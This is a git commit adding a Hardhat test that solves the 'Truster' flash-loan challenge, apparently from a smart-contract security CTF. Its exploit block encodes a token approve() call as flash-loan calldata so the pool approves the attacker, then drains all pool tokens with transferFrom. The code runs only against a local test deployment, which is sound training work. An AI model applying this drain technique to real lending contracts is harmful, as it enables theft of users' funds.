20b3027798d580f167bdac26137fbab54cf32a87
Simon Shamoon <simonshm5@gmail.com>
2022-10-27 23:24:58 -0500

    First commit

---
+++ test/truster/truster.challenge.js
@@ -0,0 +1,58 @@
+const { ethers } = require('hardhat');
+const { expect } = require('chai');
+
+describe('[Challenge] Truster', function () {
+    let deployer, attacker;
+
+    const TOKENS_IN_POOL = ethers.utils.parseEther('1000000');
+
+    before(async function () {
+        /** SETUP SCENARIO - NO NEED TO CHANGE ANYTHING HERE */
+        [deployer, attacker] = await ethers.getSigners();
+
+        const DamnValuableToken = await ethers.getContractFactory('DamnValuableToken', deployer);
+        const TrusterLenderPool = await ethers.getContractFactory('TrusterLenderPool', deployer);
+
+        this.token = await DamnValuableToken.deploy();
+        this.pool = await TrusterLenderPool.deploy(this.token.address);
+
+        await this.token.transfer(this.pool.address, TOKENS_IN_POOL);
+
+        expect(
+            await this.token.balanceOf(this.pool.address)
+        ).to.equal(TOKENS_IN_POOL);
+
+        expect(
+            await this.token.balanceOf(attacker.address)
+        ).to.equal('0');
+    });
+
+    it('Exploit', async function () {
+        /** CODE YOUR EXPLOIT HERE  */
+
+        let ABI = ["function approve(address spender, uint256 amount)"]
+
+        let iface = new ethers.utils.Interface(ABI);
+
+        let callData = iface.encodeFunctionData("approve", [attacker.address, TOKENS_IN_POOL.toString()])
+
+        await this.pool.flashLoan(0, attacker.address, this.token.address, callData)
+
+        console.log(this.token.address.allowance)
+
+        await this.token.transferFrom(this.pool.address, attacker.address, TOKENS_IN_POOL.toString())
+    });
+
+    after(async function () {
+        /** SUCCESS CONDITIONS */
+
+        // Attacker has taken all tokens from the pool
+        expect(
+            await this.token.balanceOf(attacker.address)
+        ).to.equal(TOKENS_IN_POOL);
+        expect(
+            await this.token.balanceOf(this.pool.address)
+        ).to.equal('0');
+    });
+});
+
